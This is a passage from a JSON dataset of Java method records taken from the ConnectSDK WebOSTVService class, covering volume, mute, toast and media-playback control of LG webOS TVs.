ByteArrayOutputStream();\n                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);\n\n                    byte[] bitmapByte = stream.toByteArray();\n                    bitmapByte = Base64.encode(bitmapByte,Base64.NO_WRAP);\n                    String bitmapData = new String(bitmapByte);\n\n                    payload.put(\"iconData\", bitmapData);\n                    payload.put(\"iconExtension\", \"png\");\n                }\n            } catch (NameNotFoundException e) {\n                e.printStackTrace();\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        String uri = \"palm://system.notifications/createToast\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34654, "method_name": "getVolumeControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "VolumeControl", "snippet": "    public VolumeControl getVolumeControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34655, "method_name": "getVolumeControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getVolumeControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34656, "method_name": "volumeUp", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void volumeUp() {\n        volumeUp(null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34657, "method_name": "volumeUp", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void volumeUp(ResponseListener<Object> listener) {\n        String uri = \"ssap://audio/volumeUp\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34658, "method_name": "volumeDown", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void volumeDown() {\n        volumeDown(null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34659, "method_name": "volumeDown", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void volumeDown(ResponseListener<Object> listener) {\n        String uri = \"ssap://audio/volumeDown\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34660, "method_name": "setVolume", "class_name": "WebOSTVService", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVolume(int volume) { \n        setVolume(volume, null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34661, "method_name": "setVolume", "class_name": "WebOSTVService", "params": ["float", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVolume(float volume, ResponseListener<Object> listener) {\n        String uri = \"ssap://audio/setVolume\";\n        JSONObject payload = new JSONObject();\n        int intVolume = (int) Math.round(volume*100.0f);\n\n        try {\n            payload.put(\"volume\", intVolume);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34662, "method_name": "getVolume", "class_name": "WebOSTVService", "params": ["boolean", "VolumeListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<VolumeListener>", "snippet": "    private ServiceCommand<VolumeListener> getVolume(boolean isSubscription, final VolumeListener listener) {\n        ServiceCommand<VolumeListener> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    int iVolume = (Integer) jsonObj.get(\"volume\");\n                    float fVolume = (float) (iVolume / 100.0);\n\n                    Util.postSuccess(listener, fVolume);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<VolumeListener>(this, VOLUME, null, true, responseListener);\n        else\n            request = new ServiceCommand<VolumeListener>(this, VOLUME, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34663, "method_name": "getVolume", "class_name": "WebOSTVService", "params": ["VolumeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getVolume(VolumeListener listener) {\n        getVolume(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34664, "method_name": "subscribeVolume", "class_name": "WebOSTVService", "params": ["VolumeListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<VolumeListener>", "snippet": "    public ServiceSubscription<VolumeListener> subscribeVolume(VolumeListener listener) {\n        return (ServiceSubscription<VolumeListener>) getVolume(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34665, "method_name": "setMute", "class_name": "WebOSTVService", "params": ["boolean", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMute(boolean isMute, ResponseListener<Object> listener) {\n        String uri = \"ssap://audio/setMute\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"mute\", isMute);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34666, "method_name": "getMuteStatus", "class_name": "WebOSTVService", "params": ["boolean", "MuteListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getMuteStatus(boolean isSubscription, final MuteListener listener) {\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    boolean isMute = (Boolean) jsonObj.get(\"mute\");\n                    Util.postSuccess(listener, isMute);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, MUTE, null, true, responseListener);\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, MUTE, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34667, "method_name": "getMute", "class_name": "WebOSTVService", "params": ["MuteListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getMute(MuteListener listener) {\n        getMuteStatus(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34668, "method_name": "subscribeMute", "class_name": "WebOSTVService", "params": ["MuteListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<MuteListener>", "snippet": "    public ServiceSubscription<MuteListener> subscribeMute(MuteListener listener) {\n        return (ServiceSubscription<MuteListener>) getMuteStatus(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34669, "method_name": "getVolumeStatus", "class_name": "WebOSTVService", "params": ["boolean", "VolumeStatusListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getVolumeStatus(boolean isSubscription, final VolumeStatusListener listener) {\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject) response;\n                    boolean isMute = (Boolean) jsonObj.get(\"mute\");\n                    int iVolume = jsonObj.getInt(\"volume\");\n                    float fVolume = (float) (iVolume / 100.0);\n\n                    Util.postSuccess(listener, new VolumeStatus(isMute, fVolume));\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, VOLUME_STATUS, null, true, responseListener);\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, VOLUME_STATUS, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34670, "method_name": "getVolumeStatus", "class_name": "WebOSTVService", "params": ["VolumeStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getVolumeStatus(VolumeStatusListener listener) {\n        getVolumeStatus(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34671, "method_name": "subscribeVolumeStatus", "class_name": "WebOSTVService", "params": ["VolumeStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<VolumeStatusListener>", "snippet": "    public ServiceSubscription<VolumeStatusListener> subscribeVolumeStatus(VolumeStatusListener listener) {\n        return (ServiceSubscription<VolumeStatusListener>) getVolumeStatus(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34672, "method_name": "getMediaPlayer", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaPlayer", "snippet": "    public MediaPlayer getMediaPlayer() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34673, "method_name": "getMediaPlayerCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaPlayerCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34674, "method_name": "getMediaInfo", "class_name": "WebOSTVService", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getMediaInfo(MediaInfoListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34675, "method_name": "subscribeMediaInfo", "class_name": "WebOSTVService", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<MediaInfoListener>", "snippet": "    public ServiceSubscription<MediaInfoListener> subscribeMediaInfo(\n            MediaInfoListener listener) {\n        listener.onError(ServiceCommandError.notSupported());\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34676, "method_name": "displayMedia", "class_name": "WebOSTVService", "params": ["JSONObject", "MediaPlayer"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void displayMedia(JSONObject params, final MediaPlayer.LaunchListener listener) {\n        String uri = \"ssap://media.viewer/open\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject obj = (JSONObject) response;\n\n                LaunchSession launchSession = LaunchSession.launchSessionForAppId(obj.optString(\"id\"));\n                launchSession.setService(WebOSTVService.this);\n                launchSession.setSessionId(obj.optString(\"sessionId\"));\n                launchSession.setSessionType(LaunchSessionType.Media);\n\n                Util.postSuccess(listener, new MediaLaunchObject(launchSession, WebOSTVService.this));\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, params, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34677, "method_name": "displayImage", "class_name": "WebOSTVService", "params": ["String", "String", "String", "String", "String", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(final String url, final String mimeType, final String title, final String description, final String iconSrc, final MediaPlayer.LaunchListener listener) {\n        if (\"4.0.0\".equalsIgnoreCase(this.serviceDescription.getVersion())) {\n            DeviceService dlnaService = this.getDLNAService();\n\n            if (dlnaService != null) {\n                MediaPlayer mediaPlayer = dlnaService.getAPI(MediaPlayer.class);\n\n                if (mediaPlayer != null) {\n                    mediaPlayer.displayImage(url, mimeType, title, description, iconSrc, listener);\n                    return;\n                }\n            }\n\n            JSONObject params = null;\n\n            try {\n                params = new JSONObject() {{\n                    put(\"target\", url);\n                    put(\"title\", title == null ? NULL : title);\n                    put(\"description\", description == null ? NULL : description);\n                    put(\"mimeType\", mimeType == null ? NULL : mimeType);\n                    put(\"iconSrc\", iconSrc == null ? NULL : iconSrc);\n                }};\n            } catch (JSONException ex) {\n                ex.printStackTrace();\n                Util.postError(listener, new ServiceCommandError(-1, ex.getLocalizedMessage(), ex));\n            }\n\n            if (params != null)\n                this.displayMedia(params, listener);\n        } else {\n            final WebAppSession.LaunchListener webAppLaunchListener = new WebAppSession.LaunchListener() {\n\n                @Override\n                public void onError(ServiceCommandError error) {\n                    listener.onError(error);\n                }\n\n                @Override\n                public void onSuccess(WebAppSession webAppSession) {\n                    webAppSession.displayImage(url, mimeType, title, description, iconSrc, listener);\n                }\n            };\n\n            this.getWebAppLauncher().joinWebApp(MEDIA_PLAYER_ID, new WebAppSession.LaunchListener() {\n\n                @Override\n                public void onError(ServiceCommandError error) {\n                    getWebAppLauncher().launchWebApp(MEDIA_PLAYER_ID, webAppLaunchListener);\n                }\n\n                @Override\n                public void onSuccess(WebAppSession webAppSession) {\n                    webAppSession.displayImage(url, mimeType, title, description, iconSrc, listener);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34678, "method_name": "displayImage", "class_name": "WebOSTVService", "params": ["MediaInfo", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(MediaInfo mediaInfo, MediaPlayer.LaunchListener listener) {\n        String mediaUrl = null;\n        String mimeType = null;\n        String title = null;\n        String desc = null;\n        String iconSrc = null;\n\n        if (mediaInfo != null) {\n            mediaUrl = mediaInfo.getUrl();\n            mimeType = mediaInfo.getMimeType();\n            title = mediaInfo.getTitle();\n            desc = mediaInfo.getDescription();\n\n            if (mediaInfo.getImages() != null && mediaInfo.getImages().size() > 0) {\n                ImageInfo imageInfo = mediaInfo.getImages().get(0);\n                iconSrc = imageInfo.getUrl();\n            }\n        }\n\n        displayImage(mediaUrl, mimeType, title, desc, iconSrc, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34679, "method_name": "playMedia", "class_name": "WebOSTVService", "params": ["String", "String", "String", "String", "String", "boolean", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(final String url, final String mimeType, final String title, final String description, final String iconSrc, final boolean shouldLoop, final MediaPlayer.LaunchListener listener) {\n        if (\"4.0.0\".equalsIgnoreCase(this.serviceDescription.getVersion())) {\n            DeviceService dlnaService = this.getDLNAService();\n\n            if (dlnaService != null) {\n                MediaPlayer mediaPlayer = dlnaService.getAPI(MediaPlayer.class);\n\n                if (mediaPlayer != null) {\n                    mediaPlayer.playMedia(url, mimeType, title, description, iconSrc, shouldLoop, listener);\n                    return;\n                }\n            }\n\n            JSONObject params = null;\n\n            try {\n                params = new JSONObject() {{\n                    put(\"target\", url);\n                    put(\"title\", title == null ? NULL : title);\n                    put(\"description\", description == null ? NULL : description);\n                    put(\"mimeType\", mimeType == null ? NULL : mimeType);\n                    put(\"iconSrc\", iconSrc == null ? NULL : iconSrc);\n                    put(\"loop\", shouldLoop);\n                }};\n            } catch (JSONException ex) {\n                ex.printStackTrace();\n                Util.postError(listener, new ServiceCommandError(-1, ex.getLocalizedMessage(), ex));\n            }\n\n            if (params != null)\n                this.displayMedia(params, listener);\n        } else {\n            final WebAppSession.LaunchListener webAppLaunchListener = new WebAppSession.LaunchListener() {\n\n                @Override\n                public void onError(ServiceCommandError error) {\n                    listener.onError(error);\n                }\n\n                @Override\n                public void onSuccess(WebAppSession webAppSession) {\n                    webAppSession.playMedia(url, mimeType, title, description, iconSrc, shouldLoop, listener);\n                }\n            };\n\n            this.getWebAppLauncher().joinWebApp(MEDIA_PLAYER_ID, new WebAppSession.LaunchListener() {\n\n                @Override\n                public void onError(ServiceCommandError error) {\n                    getWebAppLauncher().launchWebApp(MEDIA_PLAYER_ID, webAppLaunchListener);\n                }\n\n                @Override\n                public void onSuccess(WebAppSession webAppSession) {\n                    webAppSession.playMedia(url, mimeType, title, description, iconSrc, shouldLoop, listener);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34680, "method_name": "playMedia", "class_name": "WebOSTVService", "params": ["MediaInfo", "boolean", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(MediaInfo mediaInfo, boolean shouldLoop, MediaPlayer.LaunchListener listener) {\n        String mediaUrl = null;\n        String mimeType = null;\n        String title = null;\n        String desc = null;\n        String iconSrc = null;\n\n        if (mediaInfo != null) {\n            mediaUrl = mediaInfo.getUrl();\n            mimeType = mediaInfo.getMimeType();\n            title = mediaInfo.getTitle();\n            desc = mediaInfo.getDescription();\n\n            if (mediaInfo.getImages() != null && mediaInfo.getImages().size() > 0) {\n                ImageInfo imageInfo = mediaInfo.getImages().get(0);\n                iconSrc = imageInfo.getUrl();\n            }\n        }\n\n        playMedia(mediaUrl, mimeType, title, desc, iconSrc, shouldLoop, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34681, "method_name": "closeMedia", "class_name": "WebOSTVService", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeMedia(LaunchSession launchSession, ResponseListener<Object> listener) {\n        JSONObject payload = new JSONObject();\n\n        try {\n            if (launchSession.getAppId() != null && launchSession.getAppId().length() > 0)\n                payload.put(\"id\", launchSession.getAppId());\n\n            if (launchSession.getSessionId() != null && launchSession.getSessionId().length() > 0)\n                payload.put(\"sessionId\", launchSession.getSessionId());\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(launchSession.getService(), CLOSE_MEDIA_URI, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34682, "method_name": "getMediaControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaControl", "snippet": "    public MediaControl getMediaControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", 